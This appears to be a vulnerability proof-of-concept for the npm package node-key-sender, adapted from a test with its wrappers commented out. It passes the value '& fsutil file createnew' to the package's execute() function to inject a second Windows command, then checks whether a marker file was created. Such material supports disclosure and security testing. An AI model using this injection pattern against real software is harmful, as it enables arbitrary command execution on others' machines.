// test("Command Injection in node-key-sender", () => {
//   expect.assertions(2);
  const root = require("node-key-sender");
  const fs = require("fs");
  const path = "./node-key-sender";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  let attack_code = ["& fsutil file createnew", "node-key-sender","0"];
  return root.execute(attack_code).then(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {});
  });
// });
